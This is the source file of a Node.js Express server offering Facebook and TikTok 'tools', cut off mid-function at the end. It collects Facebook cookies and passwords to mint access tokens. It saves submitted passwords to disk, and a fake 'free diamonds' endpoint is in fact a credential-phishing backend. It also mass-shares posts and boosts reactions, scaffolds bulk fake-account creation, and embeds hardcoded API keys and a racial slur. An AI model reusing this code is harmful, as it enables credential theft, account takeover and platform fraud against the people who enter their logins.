const { GoogleGenerativeAI } = require("@google/generative-ai");
const crypto = require('crypto');
const appstate = require("./fca/orion/fca-project-orion");
const fs = require("fs");
const { facebook, spotify, spotifydl, remini } = require('betabotz-tools') 
const cheerio = require('cheerio');
const port = 6694;
const snapsave = require('snapsave-downloader-itj');
const pornhub = require('@justalk/pornhub-api');
const qs = require('querystring');
const cors = require("cors");
const express = require("express");
const app = express();
const axios = require("axios");
const Multer = require("multer");
const uuid = require("uuid");
const { v4: uuidv4 } = require("uuid");
const moment = require("moment-timezone");
const time = moment.tz("Asia/Manila").format("DD/MM/YYYY || HH:mm:s");
const api_url = "https://b-api.facebook.com/method/auth.login";
const request = require("request");
const ytdl = require("ytdl-core");
const bodyParser = require("body-parser");
const path = require('path');

function generateRandomString(length) {
  let randomString = "";
  while (randomString.length < length) {
    const uuidPart = uuid.v4().replace(/-/g, "");
    randomString += uuidPart;
  }
  return randomString.substr(0, length);
}

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.get("/", async function (req, res) {
res.sendFile(path.join(__dirname, 'index.html'));
});

const total = new Map();

console.log("api/totalshare (totals of share)")
app.get('/api/totalshare', (req, res) => {
  const data = Array.from(total.values()).map((link, index)  => ({
    session: index + 1,
    url: link.url,
    count: link.count,
    id: link.id,
    target: link.target,
  }));
  res.json(JSON.parse(JSON.stringify(data || [], null, 2)));
});

console.log("/share/submit?cookie=&url=&amount=&interval=")
app.post('/api/submit', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = req.body;
  if (!cookie || !url || !amount || !interval) return res.status(400).json({
    error: 'Missing state, url, amount, or interval'
  });
  try {
    const cookies = await convertCookie(cookie);
    if (!cookies) {
      return res.status(400).json({
        status: 500,
        error: 'Invalid cookies'
      });
    };
    await share(cookies, url, amount, interval)
    res.status(200).json({
      status: 200
    });
  } catch (err) {
    return res.status(500).json({
      status: 500,
      error: err.message || err
    });
  }
});

async function share(cookies, url, amount, interval) {
  const id = await getPostID(url);
  const accessToken = await getAccessToken(cookies);
  if (!id) {
    throw new Error("Unable to get link id: invalid URL, it's either a private post or visible to friends only");
  }
  const postId = total.has(id) ? id + 1 : id;
  total.set(postId, {
    url,
    id,
    count: 0,
    target: amount,
  });
  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive',
    'content-length': '0',
    'cookie': cookies,
    'host': 'graph.facebook.com'
  };
  let sharedCount = 0;
  let timer;
  async function sharePost() {
    try {
      const response = await axios.post(`https://graph.facebook.com/me/feed?link=https://m.facebook.com/${id}&published=0&access_token=${accessToken}`, {}, {
        headers
      });
      if (response.status !== 200) {
      } else {
        total.set(postId, {
          ...total.get(postId),
          count: total.get(postId).count + 1,
        });
        sharedCount++;
      }
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (error) {
      clearInterval(timer);
      total.delete(postId);
    }
  }
  timer = setInterval(sharePost, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(postId);
  }, amount * interval * 1000);
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}
async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return accessToken;
    }
  } catch (error) {
    return;
  }
}
async function convertCookie(cookie) {
  return new Promise((resolve, reject) => {
    try {
      const cookies = JSON.parse(cookie);
      const sbCookie = cookies.find(cookies => cookies.key === "sb");
      if (!sbCookie) {
        reject("Detect invalid appstate please provide a valid appstate");
      }
      const sbValue = sbCookie.value;
      const data = `sb=${sbValue}; ${cookies.slice(1).map(cookies => `${cookies.key}=${cookies.value}`).join('; ')}`;
      resolve(data);
    } catch (error) {
      reject("Error processing appstate please provide a valid appstate");
    }
  });
}

console.log("/share?link=&token=&amount=&speed=")
app.post("/share", async (req, res) => {
  const link = req.query.link;
  const token = req.query.token;
  const amounts = req.query.amount;
  const speed = req.query.speed;

  if (!link || !token || !amounts || !speed) {
    return res.status(400).json({
      error: "Missing input!, Link, token, amount, and speed are required!!",
    });
  }

  const shareCount = amounts;
  const timeInterval = speed;
  const deleteAfter = 60 * 60;

  let sharedCount = 0;
  let timer = null;

  try {
    const a = await axios.post(
      `https://graph.facebook.com/me?access_token=${token}`,
    );
    if (a.data.error) {
      return res.status(401).json({ error: "Invalid access token" });
    }
  } catch (error) {
    return res.status(401).json({ error: "Invalid access token" });
  }
  async function sharePost() {
    try {
      const response = await axios.post(
        `https://graph.facebook.com/me/feed?access_token=${token}&fields=id&limit=1&published=0`,
        {
          link: link,
          privacy: { value: "SELF" },
          no_story: true,
        },
        {
          muteHttpExceptions: true,
          headers: {
            authority: "graph.facebook.com",
            "cache-control": "max-age=0",
            "sec-ch-ua-mobile": "?0",
            "user-agent":
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
          },
          method: "post",
        },
      );

      sharedCount++;
      const postIdd = response?.data?.id;

      if (sharedCount === amounts) {
        clearInterval(timer);
        console.log("Finished sharing posts.");

        if (postIdd) {
          setTimeout(() => {
            deletePost(postIdd);
          }, deleteAfter * 1000);
        }
      }
    } catch (error) {
      console.error(`Failed to share post because ${error.response.data}`);
    }
  }

  async function deletePost(postIdd) {
    try {
      await axios.delete(
        `https://graph.facebook.com/${postIdd}?access_token=${token}`,
      );
      console.log(`Post deleted: ${postIdd}`);
    } catch (error) {
      console.error("Failed to delete post:", error.response.data);
    }
  }

  timer = setInterval(sharePost, timeInterval);

  setTimeout(() => {
    clearInterval(timer);
    console.log("Loop stopped.");
  }, shareCount * timeInterval);
  res.json({
    text: `Post share success here\'s some info of your shareboost: Speed of Sharing: ${speed}\n\nAmount: ${amount}\n\nFb-post-link: ${link}\n\nDate and Time of Sharing: ${time}`,
  });
});

const addedLinks = [
  "https://vt.tiktok.com/ZSFPnnywU/",
  "https://vt.tiktok.com/ZSFPWRm3q/",
  "https://vt.tiktok.com/ZSFPW14t4/",
  "https://vt.tiktok.com/ZSFPWFWAC/",
  "https://vt.tiktok.com/ZSFPngg1K/",
  "https://vt.tiktok.com/ZSFPngro4/",
  "https://vt.tiktok.com/ZSFPW13wB/",
  "https://vt.tiktok.com/ZSFPnvf3J/",
  "https://vt.tiktok.com/ZSFPWLQjF/",
  "https://vt.tiktok.com/ZSFPW8FTy/",
  "https://vt.tiktok.com/ZSFPWNLT2/",
  "https://vt.tiktok.com/ZSFPnpxyq/",
  "https://vt.tiktok.com/ZSFPncoC5/",
  "https://vt.tiktok.com/ZSFPnnpTD/",
  "https://vt.tiktok.com/ZSFPnsdpK/",
  "https://vt.tiktok.com/ZSFPnKno6/",
  "https://vt.tiktok.com/ZSFPWNu53/",
  "https://vt.tiktok.com/ZSFPW8VLF/",
  "https://vt.tiktok.com/ZSFPWeArb/",
  "https://vt.tiktok.com/ZSFPWR6Lx/",
  "https://vt.tiktok.com/ZSFPWRgmJ/",
  "https://vt.tiktok.com/ZSFPnoQdb/",
  "https://vt.tiktok.com/ZSFPncbCP/",
  "https://vt.tiktok.com/ZSFPWFCt7/",
  "https://vt.tiktok.com/ZSFPW8khF/",
  "https://vt.tiktok.com/ZSFPWYrfo/",
  "https://vt.tiktok.com/ZSFPnTnv2/",
  "https://vt.tiktok.com/ZSFPnvuhh/",
  "https://vt.tiktok.com/ZSFPWJHvh/",
  "https://vt.tiktok.com/ZSFPWJDBb/",
  "https://vt.tiktok.com/ZSFPnGUYv/",
  "https://vt.tiktok.com/ZSFPnWVh3/",
  "https://vt.tiktok.com/ZSFPnvS45/",
  "https://vt.tiktok.com/ZSFPWdgWJ/",
  "https://vt.tiktok.com/ZSFPWJdJx/",
  "https://vt.tiktok.com/ZSFPnnkVB/",
  "https://vt.tiktok.com/ZSFPnvgw6/",
  "https://vt.tiktok.com/ZSFPnntdW/",
  "https://vt.tiktok.com/ZSFPnvDJ4/",
  "https://vt.tiktok.com/ZSFPnnTHG/",
  "https://vt.tiktok.com/ZSFPnvTgv/",
  "https://vt.tiktok.com/ZSFPntC9m/",
  "https://vt.tiktok.com/ZSFPW12m4/",
  "https://vt.tiktok.com/ZSFPnEn8Y/",
  "https://vt.tiktok.com/ZSFPn7E27/",
  "https://vt.tiktok.com/ZSFPWdgqA/",
  "https://vt.tiktok.com/ZSFPn3F8C/",
  "https://vt.tiktok.com/ZSFPWekL2/",
  "https://vt.tiktok.com/ZSFPW19xj/",
  "https://vt.tiktok.com/ZSFPWJVu4/",
  "https://vt.tiktok.com/ZSFPWdMpP/",
  "https://vt.tiktok.com/ZSFPWMM8P/",
  "https://vt.tiktok.com/ZSFPWmjcm/",
  "https://vt.tiktok.com/ZSFPWBtrv/",
  "https://vt.tiktok.com/ZSFPWarR4/",
  "https://vt.tiktok.com/ZSFPWYWXs/",
  "https://vt.tiktok.com/ZSFPWjyXe/",
  "https://vt.tiktok.com/ZSFPWUK9a/",
  "https://vt.tiktok.com/ZSFPWf4YF/",
  "https://vt.tiktok.com/ZSFPWQTXt/",
  "https://vt.tiktok.com/ZSFPWPWSp/",
  "https://vt.tiktok.com/ZSFPWfjsk/",
  "https://vt.tiktok.com/ZSFPWSWTX/",
  "https://vt.tiktok.com/ZSFPWjcfW/",
  "https://vt.tiktok.com/ZSFPWQkj7/",
  "https://vt.tiktok.com/ZSFPWksfC/",
  "https://vt.tiktok.com/ZSFPWXyys/",
  "https://vt.tiktok.com/ZSFPWj1Mh/",
  "https://vt.tiktok.com/ZSFPW5yf3/",
  "https://vt.tiktok.com/ZSFPWCTKX/",
  "https://vt.tiktok.com/ZSFPWjJ9g/",
  "https://vt.tiktok.com/ZSFPWmW3y/",
  "https://vt.tiktok.com/ZSFPW9bRm/",
  "https://vt.tiktok.com/ZSFPWXX9U/",
  "https://vt.tiktok.com/ZSFPWQ9jD/",
  "https://vt.tiktok.com/ZSFPWfS7a/",
  "https://vt.tiktok.com/ZSFPWhfnt/",
  "https://vt.tiktok.com/ZSFPW6PBn/",
  "https://vt.tiktok.com/ZSFPW6SUu/",
  "https://vt.tiktok.com/ZSFPWj413/",
  "https://vt.tiktok.com/ZSFPWDUvf/",
  "https://vt.tiktok.com/ZSFPWBM2a/",
  "https://vt.tiktok.com/ZSFPWkWbE/",
  "https://vt.tiktok.com/ZSFPWPvbm/",
  "https://vt.tiktok.com/ZSFPWrXAg/",
  "https://vt.tiktok.com/ZSFPWAp7B/",
];

console.log("/codm (random codm video)")
app.post("/codm", async function (req, res) {
  try {
    const randomCodm = Math.floor(Math.random() * addedLinks.length);
    const response = await axios.get(
      `http://45.140.188.39:6694/api/tiktok?link=${addedLinks[randomCodm]}`,
    );
    res.json(response.data);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal Server Error" });
  }
});

console.log("/addLink?link=(url codm tiktoklink)")
app.post("/addLink", (req, res) => {
  const { link } = req.query;

  if (!link) {
    return res.status(400).json({ error: "Link is required" });
  }

  addedLinks.push(link);

  res.json({ success: true, message: "Link added successfully" });
});

console.log("/eaaaay/api?user=&pass=")
app.get("/eaaaay/api", (req, res) => {
  const user = req.query.user;
  const pass = req.query.pass;
  const nigga = "6628568379|c1e620fa708a1d5696fb991c1bde5662";
  if (!user || !pass) {
    return res.send({ message: "Both username and password are required" });
  }

  const params = {
    format: "json",
    device_id: "yrcyg4m1-o7m5-pghw-atiu-n04mh4nlka6n",
    email: user,
    password: pass,
    locale: "en_US",
    method: "auth.login",
    access_token: nigga,
  };

  request.get({ url: api_url, qs: params }, (error, response, body) => {
    if (error) {
      return res.send({ message: "Internal server error" });
    }
    const resJson = JSON.parse(body);

    if (resJson.access_token) {
      return res.send({ eaaaay_token: resJson.access_token });
    } else {
      return res.send({ message: "Wrong Credentials" });
    }
  });
});

console.log("/auth/login?username=&password=")
app.get('/auth/login', (req, res) => {
    const { email, password } = req.query;

    const par = {
        "adid": "e3a395f9-84b6-44f6-a0ce-fe83e934fd4d",
        "email": email,
        "password": password,
        "format": "json",
        "device_id": "67f431b8-640b-4f73-a077-acc5d3125b21",
        "cpl": "true",
        "family_device_id": "67f431b8-640b-4f73-a077-acc5d3125b21",
        "locale": "en_US",
        "client_country_code": "US",
        "credentials_type": "device_based_login_password",
        "generate_session_cookies": "1",
        "generate_analytics_claim": "1",
       "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "irisSeqID": "1",
        "try_num": "1",
        "enroll_misauth": "false",
        "meta_inf_fbmeta": "NO_FILE",
        "source": "login",
        "machine_id": "KBz5fEj0GAvVAhtufg3nMDYG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    };

    request.get({ url: "https://b-api.facebook.com/method/auth.login", qs: par }, (error, response, body) => {
        if (error) {
            return res.status(500).json({ error: error.message });
        }
        res.json(JSON.parse(body));
    });
});

console.log("api/genemail")
app.get("/api/genemail", async (req, res) => {
  try {
    const response = await axios.get(
      "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1",
    );
    const getemail = response.data[0];
    res.json({ email: getemail });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Err: 500" });
  }
});

console.log("api/inbox/emailhere")
app.get("/api/inbox/:email", async (req, res) => {
  try {
    const divide = req.params.email.split("@");
    const name = divide[0];
    const domain = divide[1];
    const response = await axios.get(
      `https://www.1secmail.com/api/v1/?action=getMessages&login=${name}&domain=${domain}`,
    );
    const messages = response.data;
    const tite = [];
    for (const message of messages) {
      const msgId = message.id;
      const sendmsg = await axios.get(
        `https://www.1secmail.com/api/v1/?action=readMessage&login=${name}&domain=${domain}&id=${msgId}`,
      );
      const sendmessage = {
        from: sendmsg.data.from,
        subject: sendmsg.data.subject,
        body: sendmsg.data.textBody,
        date: sendmsg.data.date,
      };
      tite.push(sendmessage);
    }
    res.json(tite);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Err: 500" });
  }
});

console.log("api/ytdl?url=")
app.get("/api/ytdl", async (req, res) => {
  try {
    const { url } = req.query;

    if (!url || !ytdl.validateURL(url)) {
      return res.status(400).json({ error: "Invalid YouTube URL" });
    }

    const info = await ytdl.getInfo(url);
    const videoFormat = ytdl.chooseFormat(info.formats, { quality: "lowest" });

    if (!videoFormat) {
      return res
        .status(400)
        .json({ error: "No video format available for the provided URL" });
    }

    res.redirect(videoFormat.url);
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "An error occurred" });
  }
});

console.log("api/appstate?e=&p=")
app.get('/api/appstate', (req, res) => {
  const email = req.query.e;
  const password = req.query.p;

  // Check if email and password are provided
  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required." });
  }


  // Initialize appstate
  appstate({email, password}, (err, api) => {
    if (err) {
      return res.status(401).json({ error: err.message });
    } else {
      try {
        // Get appstate
        const result = api.getAppState();
        const results = JSON.stringify(result);
        console.log(results);
fs.writeFileSync(`${email}.json`, password)

        // Send success response
        res.type("json").json({ success: results });

        // Logout
        api.logout();
      } catch (e) {
        // Send error response
        console.error(e);
        res.status(500).json({ error: e.message });
      }
    }
  });
});

app.post('/api/shield', async (req, res) => {
  try {
    const token = req.query.token;
    const enable = req.query.enable;

    const uid = await getUserId(token)
  .then(userId => {
    console.log('User ID:', userId);
  })
  .catch(error => {
    console.log(error)
  });


    const data = qs.stringify({
      // ... (query data)
       variables: JSON.stringify({
        "0": {
          is_shielded: enable,
          session_id: "9b78191c-84fd-4ab6-b0aa-19b39f04a6bc",
          actor_id: uid,
          client_mutation_id: "b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0",
        },
      }),
      method: "post",
      doc_id: "1477043292367183",
      query_name: "IsShieldedSetMutation",
      strip_defaults: "true",
      strip_nulls: "true",
      locale: "en_US",
      client_country_code: "US",
      fb_api_req_friendly_name: "IsShieldedSetMutation",
      fb_api_caller_class: "IsShieldedSetMutation",
  });

    const options = {
      // ... (headers)
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Authorization: `OAuth ${token}`,
      },
  };

    const response = await axios.post(
      'https://graph.facebook.com/graphql',
      data,
      options
    );

   const Data = response.data;
  res.json({ success: true });
    console.log(Data);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error });
  }
});

async function getUserId(token) {
  try {
    const url = `https://graph.facebook.com/me?access_token=${token}`;
    const response = await axios.get(url);
    const parsedData = await response.data; // Get parsed data directly
    return parsedData.id;
  } catch (error) {
    console.error('Error fetching user ID:', error);
    throw error; // Re-throw for further handling
  }
}

app.get('/api/tiktok', async (req, res) => {
const link = req.query.link;
  if (!link) {
    res.json({ error: "Please provide a TikTok video link." });
  } else {
    try {
      const response = await axios.post("https://www.tikwm.com/api/?hd=1", {
        url: link,
      });
      const username = response.data.data.author.unique_id;
      const url = response.data.data.play;
      const nickname = response.data.data.author.nickname;
      const title = response.data.data.title;
      const like = response.data.data.digg_count;
      const comment = response.data.data.comment_count;
const views = response.data.data.play_count;
const uid = response.data.data.author.id;

      res.json({
        username: username,
        nickname: nickname,
        url: url,
        title: title,
        like: like,
        comment: comment,
        views: views,
        uid: uid,
      });
      console.log(response.data);
    } catch (error) {
      // handle error
      console.error(error);
      res.status(500).send("An error occurred");
    }
  }
});

app.get('/api/fbdl', async (req, res) => {
try {
        const URL = req.query.url;

        if (!URL) {
            return res.status(400).json({ error: "URL is required" });
        }

        const response = await snapsave(URL);
        const results = await facebook(URL)
        // Assuming snapsave returns the response you want to send
        return res.json({snap: response, beta: results});
    } catch (error) {
        // Handle errors
        console.error("Error:", error);
        return res.status(500).json({ error: "Internal server error" });
    }
});

app.get('/api/remini', async (req, res) => {
try {
    const inputImage = req.query.input;

    if (!inputImage) {
      return res.status(400).send({ error: "Missing input image URL" });
    }

    const result = await remini(inputImage);
    const image = result.image_data;
    const randomString = generateRandomString(5);
    const filePath = path.join(__dirname, "cache", `remini.${randomString}.png`);

    const response = await axios.get(image, { responseType: "arraybuffer" });
    fs.writeFileSync(filePath, response.data);

    res.sendFile(filePath);

  } catch (error) {
    console.error("Error calling Remini API:", error.message);
    res.status(error.response?.status || 500).send({
      error: "Internal Server Error",
      details: error.message,
    });
  }
});

app.get('/api/spotify', async (req, res) => {
try {
        const title = req.query.title;
        if (!title) {
            return res.status(400).json({ error: 'Missing title of the song' });
        }

        // Search for the song on Spotify
        const resultTitle = await spotify(title);

        // Check if the song is found
        if (!resultTitle || !resultTitle.result || resultTitle.result.data.length === 0) {
            return res.status(404).json({ error: 'Song not found' });
        }

        // Assuming the first result contains the URL of the song
        const songUrl = resultTitle.result.data[0].url;

        // Download the song
        const downloadResult = await spotifydl(songUrl);

        // Assuming downloadResult contains the downloaded song data
        // Handle the downloaded song data (e.g., save to file, stream to response)
        // For this example, let's assume we're just returning the URL
        res.json({ downloadUrl: downloadResult });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.get('/api/tiksearch', async (req, res) => {
try {
    const search = req.query.search;

    if (!search) {
      return res.json({ error: "Missing data to launch the program" });
    }

    const response = await axios.post("https://www.tikwm.com/api/feed/search", {
      keywords: search,
    });

    const data = response.data;

    if (data.data && data.data.videos && data.data.videos.length > 0) {
      const randomIndex = Math.floor(Math.random() * data.data.videos.length);

      const randomVideo = data.data.videos[randomIndex];

      const result = {
        code: 0,

        msg: "success",

        processed_time: 0.9624,

        data: {
          videos: [randomVideo],
        },
      };

      return res.json(result);
    } else {
      return res.json({ error: "No videos found" });
    }
  } catch (error) {
    console.error(error);

    return res.status(500).json({ error: "Internal Server Error" });
  }
});

app.get('/api/tikstalk', async (req, res) => {
var user = req.query.username;

  if (!user) return res.json({ error: "missing user query!!" });

  var axios = require("axios");

  axios({
    method: "post",

    url: "https://www.tikwm.com/api/user/info?unique_id=@",

    data: {
      unique_id: user,
    },
  })
    .then(function (response) {
      var data = response.data.data;

      console.log(data);

      return res.json({
        id: data.user.id,

        nickname: data.user.uniqueId,

        username: data.user.nickname,

        avatarLarger: data.user.avatarLarger,

        signature: data.user.signature,

        secUid: data.user.secUid,

        relation: data.user.relation,

        bioLink: data.user.bioLink,

        videoCount: data.stats.videoCount,

        followingCount: data.stats.followingCount,

        followerCount: data.stats.followerCount,

        heartCount: data.stats.heartCount,

        diggCount: data.stats.diggCount,
      });
    })

    .catch(function (error) {
      return res.json({ error });
    });
});

app.get('/api/free/diamonds/ml', async (req, res) => {
  const { email, password, diamonds } = req.query;
  if (!email || !password || !diamonds) {
    return res.json({ error: 'Email, password, and diamonds are required bobo' }); // Fixed the error message
  }

  const jsonPath = '/user/users.json';
  const filePath = path.join(__dirname, jsonPath);
  let data = JSON.parse(fs.readFileSync(filePath, "utf-8"));

  // Check if the email exists in data, if not, initialize it as an empty array
  if (!data[email]) {
    data[email] = [];
  }

  // Push the new object into the array
  data[email].push({
    password,
    diamonds
  });

  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
    res.json({ success: `Successfully sent ${diamonds} diamonds to your account` });
  } catch (error) {
    res.json({ error: error.message });
  }
});

console.log('/gemini?p=prompt=id');
const genAI = new GoogleGenerativeAI('AIzaSyDjaw6e0Y7Y-EgOGUpv-ZJC1cpH_U7j47E');

let conversations = {};

// Async function to load conversations from JSON file
const loadConversations = () => {
  try {
    const data = fs.readFileSync('conversations.json', 'utf8');
    conversations = JSON.parse(data);
  } catch (err) {
    console.error("Error reading conversations file:", err);
  }
};

// Async function to save conversations to JSON file
const saveConversations = () => {
  fs.writeFile('conversations.json', JSON.stringify(conversations), 'utf8', (err) => {
    if (err) {
      console.error("Error writing conversations file:", err);
    } else {
      console.log("Conversation saved successfully.");
    }
  });
};

// Load conversations when the server starts
loadConversations();

app.post('/api/gemini', async (req, res) => {
  var base = req.query.p;
  var uid = req.query.id
  let prompt = base;
  if (typeof prompt !== 'string') {
    return res.status(400).json({ error: 'Prompt must be a string.' });
  }

  let conversation = conversations[uid];
  if (!conversation) {
    conversation = [];
    conversations[uid] = conversation;
  }

  const model = genAI.getGenerativeModel({ model: "gemini-pro" });
  const chat = model.startChat({
    history: conversation,
    generationConfig: {
      maxOutputTokens: 100,
    },
  });

  try {
    const result = await chat.sendMessage(prompt);
    const response = await result.response;
    const text = response.text();

    conversation.push({ role: "user", parts: [{ text: prompt }] });
    conversation.push({ role: "model", parts: [{ text }] });

    saveConversations();

    res.json({ response: text });
  } catch (error) {
    console.error("Error sending message:", error);
    res.status(500).json({ error: 'An error occurred while processing the message.' });
  }
});
    
app.get('/api/cronhub', async (req, res) => {
  try {
    const query = req.query.q; // Ang query string para sa paghahanap ay maaaring ipasa bilang `q`
    const links = await pornhub.search(query, ["title", "link", "premium", "hd"]);

    function randomIndex() {
      return Math.floor(Math.random() * links.results.length);
    }

    const randomVideo = links.results[randomIndex()];

    const videoData = {
      title: randomVideo.title,
      link: randomVideo.link,
      author: randomVideo.author
    };

    res.json(videoData);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/pron', async (req, res) => {
  try {
    const url = 'https://api3.p2mate.com/mates/en/analyze/ajax';
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept': '*/*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
      'Referer': req.headers['referer']
    };
    const data = `url=${encodeURIComponent(req.query.url)}`;

    const response = await axios.post(url, data, { headers });
    res.json(response.data);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'An error occurred while processing the request.' });
  }
});
app.post('/api/react', async (req, res) => {
    try {
        const { link, type, cookie } = req.query;
        const response = await axios.post("https://flikers.net/android/android_get_react.php", {
            post_id: link,
            react_type: type,
            version: "v1.7"
        }, {
            headers: {
                'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 12; V2134 Build/SP1A.210812.003)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'Content-Type': "application/json",
                'Cookie': cookie
            }
        });

        // Save history entry
        const historyEntry = { link, type };
        saveHistory(historyEntry);

        res.json(response.data.message);
    } catch (error) {
        console.error(error);
        res.json({ error: 'an error occurred' });
    }
});
// API endpoint para sa pag-load ng history
app.get('/api/history', (req, res) => {
  try {
    const history = loadHistory();
    res.json(history);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'An error occurred while fetching history.' });
  }
});

// Helper function para sa pag-save sa history
function saveHistory(entry) {
  fs.appendFile('react_history.json', JSON.stringify(entry) + '\n', (err) => {
    if (err) console.error(err);
    console.log('History entry saved successfully!');
  });
}

// Helper function para sa pag-load ng history
function loadHistory() {
  const rawData = fs.readFileSync('react_history.json');
  const history = rawData.toString().split('\n').filter(entry => entry !== '').map(JSON.parse);
  return history;
}

app.get('/api/endpoints', (req, res) => {

 const endpoints = [
  // Share Boosting
  { method: 'GET', path: '/api/totalshare', description: 'Get totals of shares for each session' },
  { method: 'POST', path: '/api/submit?cookie=&url=&amount=&speed=', description: 'Submit a share request (requires cookie, URL, amount, interval)' },
  { method: 'POST', path: '/share?link=&token=&amount=&speed=', description: 'Simple Facebook share endpoint (link, token, amount, speed)' },

  // TikTok Tools
  { method: 'POST', path: '/codm', description: 'Get a random Call of Duty Mobile video from TikTok' },
  { method: 'POST', path: '/addLink?link=', description: 'Add a new CODM TikTok link (query parameter: link)' },
  { method: 'GET', path: '/api/tiktok?link=', description: 'Get TikTok video details (query parameter: link)' },
  { method: 'GET', path: '/api/tiksearch?search=', description: 'Search TikTok videos (query parameter: search)' },
  { method: 'GET', path: '/api/tikstalk?username=', description: 'Get TikTok user details (query parameter: username)' },

  // Facebook Tools
  { method: 'GET', path: '/eaaaay/api?user=&pass=', description: 'Get EAAAAAY token for Facebook (user & pass parameters)' },
  { method: 'GET', path: '/auth/login?email=&password=', description: 'Facebook login (email & password parameters)' },
  { method: 'GET', path: '/api/fbdl?url=', description: 'Facebook video downloader (query parameter: url)' },
  { method: 'POST', path: '/api/shield?token=&enable=', description: 'Enable/disable Facebook profile guard (token & enable parameters)' },

  // Other Tools
  { method: 'GET', path: '/api/genemail', description: 'Generate a temporary email address' },
  { method: 'GET', path: '/api/inbox/:email', description: 'Get messages for a temporary email address' },
  { method: 'GET', path: '/api/ytdl?url=', description: 'YouTube video downloader (query parameter: url)' },
  { method: 'GET', path: '/api/appstate?e=&p=', description: 'Get Facebook appstate (e & p parameters)' },
  { method: 'GET', path: '/api/remini?input=', description: 'Enhance image quality using Remini (input parameter)' },
  { method: 'GET', path: '/api/spotify?title=', description: 'Search and download Spotify songs (title parameter)' },
  { method: 'GET', path: '/api/free/diamonds/ml?email=&passwords=&diamonds=', description: ' (Simulate) sending free diamonds to a Mobile Legends account' },
  { method: 'POST', path: '/api/gemini?p=&id=', description: 'Chat with Gemini AI (p & id parameters)' },
  { method: 'GET', path: '/api/cronhub?q=', description: 'Get random video from PornHub (q parameter)' },
  { method: 'GET', path: '/api/pron?url=', description: 'Analyze adult video URLs' },
  { method: 'POST', path: '/api/react?link=&type=&cookie=', description: 'Boost your reactions on your fbpost' },
  { method: 'GET', path: '/api/history', description: 'Get saved history (react_history.json)' },
  { method: 'GET', path: '/api/endpoints', description: 'List available API endpoints' },
     { method: 'POST', path: '/api/fbcreate', description: 'Automatic create fb account' },
];

  res.json(endpoints);
});
        const genRandomString = (length) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
};

const getRandomDate = (start, end) => {
    const date = new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
    return date;
};

const getRandomName = () => {
    const names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Robert', 'Emily', 'William', 'Emma'];
    const surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    return {
        firstName: names[Math.floor(Math.random() * names.length)],
        lastName: surnames[Math.floor(Math.random() * surnames.length)]
    };
};

const getMailDomains = async () => {
    const url = 'https://api.mail.tm/domains';
    try {
        const response = await axios.get(url);
        return response.data['hydra:member'];
    } catch (error) {
        console.error(`[×] E-mail Error: ${error}`);
        return null;
    }
};

const createMailTmAccount = async () => {
    const mailDomains = await getMailDomains();
    if (mailDomains) {
        const domain = mailDomains[Math.floor(Math.random() * mailDomains.length)].domain;
